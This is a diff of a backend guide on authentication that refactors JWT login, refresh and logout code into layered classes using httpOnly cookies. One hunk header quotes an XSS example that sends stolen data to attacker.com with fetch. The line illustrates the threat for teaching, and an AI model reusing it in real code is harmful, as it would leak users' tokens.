@@ -1,7 +1,7 @@
 # Authentication & Security
 
 **Category:** Backend Development  
-**Last Updated:** January 23, 2026  
+**Last Updated:** July 3, 2026  
 **Epic 13 Reference:** [Story 13.3 Authentication](../../issue-implementation/epic-13-production-backend-architecture/story-13-3-authentication.md)
 
 ## TL;DR Quick Reference
@@ -27,92 +27,98 @@ npm install jsonwebtoken bcrypt cookie-parser
 // 1. Install
 npm install jsonwebtoken bcrypt
 npm install -D @types/jsonwebtoken @types/bcrypt
-
-import jwt from 'jsonwebtoken';
-
-// 2. Generate tokens
-function generateAccessToken(userId: string): string {
-  return jwt.sign(
-    { userId, type: 'access' },
-    process.env.JWT_SECRET!,
-    { expiresIn: '15m' }
-  );
-}
-
-function generateRefreshToken(userId: string): string {
-  return jwt.sign(
-    { userId, type: 'refresh' },
-    process.env.JWT_REFRESH_SECRET!,
-    { expiresIn: '7d' }
-  );
-}
-
-// 3. Verify token middleware
-function authenticate(req, res, next) {
-  const token = req.headers.authorization?.replace('Bearer ', '');
-
-  if (!token) {
-    return res.status(401).json({ error: 'No token provided' });
-  }
-
-  try {
-    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
-    req.userId = decoded.userId;
-    next();
-  } catch (error) {
-    return res.status(401).json({ error: 'Invalid token' });
-  }
-}
-
-// 4. Refresh endpoint
-app.post('/api/auth/refresh', async (req, res) => {
-  const { refreshToken } = req.body;
-
-  try {
-    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET!);
-    const newAccessToken = generateAccessToken(decoded.userId);
-    res.json({ accessToken: newAccessToken });
-  } catch (error) {
-    res.status(401).json({ error: 'Invalid refresh token' });
-  }
-});
 ```
 
-### Password Hashing with bcrypt
+#### Controller Layer
+
+Authentication endpoints are handled by controllers in `modules/auth/api/AuthController.ts`. Controllers are thin — they parse the request, delegate to the service, and format the response.
 
 ```typescript
-import bcrypt from "bcrypt";
+// authController.ts
+import { Request, Response } from "express";
+import { AuthService } from "../services/AuthService.js";
 
-// Hash password
-async function hashPassword(plainPassword: string): Promise<string> {
-  const salt = await bcrypt.genSalt(10);
-  return bcrypt.hash(plainPassword, salt);
-}
+export class AuthController {
+  constructor(private readonly authService: AuthService) {}
 
-// Verify password
-async function verifyPassword(plain: string, hashed: string): Promise<boolean> {
-  return bcrypt.compare(plain, hashed);
-}
+  async login(req: Request, res: Response) {
+    const { email, password } = req.body;
+    const { user, accessToken, refreshToken } = await this.authService.login(email, password);
 
-// Login endpoint
-app.post("/api/auth/login", async (req, res) => {
-  const { email, password } = req.body;
+    res.cookie("refreshToken", refreshToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
+      path: "/",
+      maxAge: 7 * 24 * 60 * 60 * 1000,
+    });
 
-  const user = await prisma.user.findUnique({ where: { email } });
-  if (!user) {
-    return res.status(401).json({ error: "Invalid credentials" });
+    res.json({ accessToken, user: { id: user.id, email: user.email } });
   }
 
-  const valid = await verifyPassword(password, user.password);
-  if (!valid) {
-    return res.status(401).json({ error: "Invalid credentials" });
+  async refresh(req: Request, res: Response) {
+    const refreshToken = req.cookies.refreshToken;
+    const tokens = await this.authService.refresh(refreshToken);
+    res.json(tokens);
+  }
+}
+```
+
+#### Service Layer
+
+Business logic lives in services, never in controllers. Services use repositories for data access, and infrastructure services (JwtService, PasswordService) for security operations.
+
+```typescript
+// AuthService.ts
+import { UserRepository } from "../repositories/UserRepository.js";
+import { JwtService } from "../../../shared/infrastructure/security/JwtService.js";
+import { PasswordService } from "../../../shared/infrastructure/security/PasswordService.js";
+
+export class AuthService {
+  constructor(
+    private readonly userRepository: UserRepository,
+    private readonly jwtService: JwtService,
+    private readonly passwordService: PasswordService,
+  ) {}
+
+  async login(email: string, password: string) {
+    const user = await this.userRepository.findByEmail(email);
+    if (!user) {
+      throw new AuthError("Invalid credentials", 401);
+    }
+
+    const valid = await this.passwordService.verify(password, user.password);
+    if (!valid) {
+      throw new AuthError("Invalid credentials", 401);
+    }
+
+    const accessToken = this.jwtService.sign({ userId: user.id, email: user.email }, "15m");
+    const refreshToken = this.jwtService.signRefresh({ userId: user.id }, "7d");
+
+    return { user, accessToken, refreshToken };
   }
 
-  const accessToken = generateAccessToken(user.id);
-  const refreshToken = generateRefreshToken(user.id);
+  async refresh(refreshToken: string) {
+    const decoded = this.jwtService.verifyRefresh(refreshToken);
+    const accessToken = this.jwtService.sign({ userId: decoded.userId }, "15m");
+    return { accessToken };
+  }
+}
+```
 
-  res.json({ accessToken, refreshToken, user: { id: user.id, email: user.email } });
-});
+#### Repository Layer
+
+Data access is handled by repositories, never directly in services or controllers.
+
+```typescript
+// UserRepository.ts
+export class UserRepository {
+  constructor(private readonly prisma: PrismaClient) {}
+
+  async findByEmail(email: string) {
+    return this.prisma.user.findUnique({ where: { email } });
+  }
+}
 ```
 
 ---
@@ -169,17 +175,14 @@ fetch("https://attacker.com/steal", { body: stolen });
 
 #### Solution: httpOnly Cookies
 
-Store refresh tokens in httpOnly cookies (backend sets, JavaScript cannot access):
+Store refresh tokens in httpOnly cookies (backend sets, JavaScript cannot access). The controller handles cookie setting while the service handles business logic:
 
-```javascript
-// Backend: Set httpOnly cookie
-app.post("/api/v1/auth/login", async (req, res) => {
+```typescript
+// AuthController.ts — Sets httpOnly cookie, delegates to service
+async login(req: Request, res: Response) {
   const { email, password } = req.body;
 
-  // ... validate credentials ...
-
-  const accessToken = generateAccessToken(user.id);
-  const refreshToken = generateRefreshToken(user.id);
+  const { user, accessToken, refreshToken } = await this.authService.login(email, password);
 
   // Set refresh token as httpOnly cookie
   res.cookie("refreshToken", refreshToken, {
@@ -190,30 +193,24 @@ app.post("/api/v1/auth/login", async (req, res) => {
     maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
   });
 
-  // Return only access token (short-lived, can be in localStorage)
+  // Return only access token (short-lived, can be in memory)
   res.json({
-    accessToken, // Frontend stores this in localStorage (15min expiry = low risk)
+    accessToken, // Frontend stores this in memory (15min expiry = low risk)
     user: { id: user.id, email: user.email },
   });
-});
+}
 
-// Backend: Read refresh token from cookie
-app.post("/api/v1/auth/refresh", async (req, res) => {
+// AuthController.ts — Reads refresh token from cookie
+async refresh(req: Request, res: Response) {
   const refreshToken = req.cookies.refreshToken; // Read from cookie
 
   if (!refreshToken) {
     return res.status(401).json({ error: "No refresh token" });
   }
 
-  try {
-    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
-    const newAccessToken = generateAccessToken(decoded.userId);
-
-    res.json({ accessToken: newAccessToken });
-  } catch (error) {
-    res.status(401).json({ error: "Invalid refresh token" });
-  }
-});
+  const tokens = await this.authService.refresh(refreshToken);
+  res.json(tokens);
+}
 ```
 
 #### Frontend Configuration
@@ -240,9 +237,9 @@ async function authFetch(url: string, options: RequestInit = {}) {
 
 #### Backend CORS Configuration
 
-CORS must allow credentials and specify origin (no wildcard):
+CORS must allow credentials and specify origin (no wildcard). CORS is applied once at the app level in `app/index.ts`:
 
-```javascript
+```typescript
 import cors from "cors";
 
 // REQUIRED: Specific origin + credentials
@@ -284,61 +281,24 @@ setRefreshTokenCookie(res, refreshToken);
 
 #### Cookie Clearing (Logout)
 
-Clearing cookies requires **exact matching options**:
+Clearing cookies requires **exact matching options**. This is done in the controller:
 
-```javascript
-// Helper: Clear cookie with EXACT matching options
-const clearRefreshTokenCookie = (res) => {
+```typescript
+// AuthController.ts
+async logout(req: Request, res: Response) {
+  const refreshToken = req.cookies.refreshToken;
+  await this.authService.logout(refreshToken);
+
+  // Clear cookie with EXACT matching options
   res.clearCookie("refreshToken", {
     httpOnly: true,
     secure: process.env.NODE_ENV === "production",
     sameSite: process.env.NODE_ENV === "production" ? "strict" : "lax",
     path: "/", // MUST match original cookie path
   });
-};
-
-// Logout endpoint
-app.post("/api/v1/auth/logout", async (req, res) => {
-  // Delete session from database
-  await prisma.session.delete({ where: { token: req.cookies.refreshToken } });
-
-  // Clear cookie (MUST use matching options)
-  clearRefreshTokenCookie(res);
 
   res.json({ success: true });
-});
-```
-
-#### Manual Cookie Parsing Fallback
-
-If `cookie-parser` middleware fails, add manual parsing:
-
-```javascript
-// Fallback: Manual cookie parsing
-const getRefreshToken = (req) => {
-  // Try cookie-parser first
-  if (req.cookies?.refreshToken) {
-    return req.cookies.refreshToken;
-  }
-
-  // Fallback: Parse manually
-  const cookieHeader = req.headers.cookie;
-  if (!cookieHeader) return null;
-
-  const cookies = cookieHeader.split(";").reduce((acc, cookie) => {
-    const [key, value] = cookie.trim().split("=");
-    acc[key] = value;
-    return acc;
-  }, {});
-
-  return cookies.refreshToken || null;
-};
-
-// Usage
-app.post("/api/v1/auth/refresh", async (req, res) => {
-  const refreshToken = getRefreshToken(req);
-  // ... rest of logic
-});
+}
 ```
 
 #### Key Security Benefits
